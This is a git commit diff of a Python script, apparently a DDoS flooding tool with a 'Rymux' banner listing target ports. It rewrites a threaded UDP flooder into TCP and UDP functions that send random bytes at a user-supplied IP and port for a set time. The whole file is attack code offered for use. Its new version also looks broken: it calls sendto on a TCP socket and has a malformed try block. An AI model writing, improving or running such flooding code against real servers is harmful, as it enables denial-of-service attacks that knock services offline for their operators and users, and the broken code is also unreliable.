73a0341c289886c68d42aee3fa75b08c54bb61dc
RymuxINV <134512420+RymuxINV@users.noreply.github.com>
2023-06-11 18:08:51 +0700

    Update UDPV2.py

--- UDPV2.py
+++ UDPV2.py
@@ -1,69 +1,72 @@
 import socket
 import os
 import random
-import time
 import sys
 import struct
 import threading
+from time import time as tt
 
 os.system('cls' if os.name == 'nt' else 'clear')
-print("\033[91m██████╗░██╗░░░██╗███╗░░░███╗██╗░░░██╗██╗░░██╗")
-print("\033[91m██╔══██╗╚██╗░██╔╝████╗░████║██║░░░██║╚██╗██╔╝")
-print("\033[91m██████╔╝░╚████╔╝░██╔████╔██║██║░░░██║░╚███╔╝░")
-print("\033[91m██╔══██╗░░╚██╔╝░░██║╚██╔╝██║██║░░░██║░██╔██╗░")
-print("\033[91m██║░░██║░░░██║░░░██║░╚═╝░██║╚██████╔╝██╔╝╚██")
-print("\033[91m╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝")
 
-print(f"""
-█▀▄▀█ █▀▀ ▀█▀ █░█ █▀█ █▀▄ ▀
-█░▀░█ ██▄ ░█░ █▀█ █▄█ █▄▀ ▄
-|-----------------------|
-|   UDP    | 17091 3389 |
-|----------|------------|
+logo = """
+\033[91m██████╗░██╗░░░██╗███╗░░░███╗██╗░░░██╗██╗░░██╗
+\033[91m██╔══██╗╚██╗░██╔╝████╗░████║██║░░░██║╚██╗██╔╝
+\033[91m██████╔╝░╚████╔╝░██╔████╔██║██║░░░██║░╚███╔╝░
+\033[91m██╔══██╗░░╚██╔╝░░██║╚██╔╝██║██║░░░██║░██╔██╗░
+\033[91m██║░░██║░░░██║░░░██║░╚═╝░██║╚██████╔╝██╔╝╚██
+\033[91m╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝
+"""
 
-""")
+banner = """
+\033[91m█▀▄▀█ █▀▀ ▀█▀ █░█ █▀█ █▀▄ ▀
+\033[91m█░▀░█ ██▄ ░█░ █▀█ █▄█ █▄▀ ▄
+\033[91m|-----------------------|
+\033[91m|   TCP    | 80  | 3389 |
+\033[91m|   UDP    |17091| 7777 |
+\033[91m|----------|------------|
+"""
 
-ip = input("[+] Target: ")
-port = int(input("[+] Port: "))
-thread = int(input("[+] Threads: "))
-time = int(input("[+] Time: "))
-packet_count = int(input("[+] Packet Count: "))
-packet_size = int(input("[+] Packet Size (in bytes): "))
+method = str(input("Method (TCP, UDP) : "))
 
-def generate_payload(packet_size):
-    payload = os.urandom(packet_size)
-    return payload
+def UDP():
+    ip = str(input("IP : "))
+    port = int(input("Port : "))
+    time = int(input("Time : "))
 
-def send_packets(dest_ip, dest_port, packet_size, packet_count):
-    bytes = random._urandom(1024)
+    data = random._urandom(666)
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    addr = (str(ip),int(port))
+    startup = tt()
     while True:
-        try:
-            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-            for _ in range(packet_count):
-                payload = generate_payload(packet_size)
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
 
-                if len(payload) < packet_size:
-                    payload += b'\x00' * (packet_size - len(payload))
+        s.sendto(data, addr)
 
-                payload_length = struct.pack('!I', len(payload))
+def TCP():
+    ip = str(input("IP : "))
+    port = int(input("Port : "))
+    time = int(input("Time : "))
 
-                udp_socket.sendto(payload_length, (dest_ip, dest_port))
+    data = random._urandom(1024)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    addr = (str(ip),int(port))
+    startup = tt()
+    while True:
 
-                udp_socket.sendto(payload, (dest_ip, dest_port))
-                udp_socket.sendto(bytes, (dest_ip, dest_port))
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
 
-                time.sleep(.1)
+        s.sendto(data, addr)
 
-        except Exception as e:
-            print(f"Error: {str(e)}")
-            sys.exit(1)
-
-send_threads = []
-for _ in range(thread):
-    send_thread = threading.Thread(target=send_packets, args=(ip, port, packet_size, packet_count))
-    send_thread.start()
-    send_threads.append(send_thread)
-
-for send_thread in send_threads:
-    send_thread.join()
+if __name__ == '__main__':
+	print(logo)
+	print(banner)
+	try:
+       if method == 'TCP':
+           TCP()
+       elif method == 'UDP':
+           UDP()
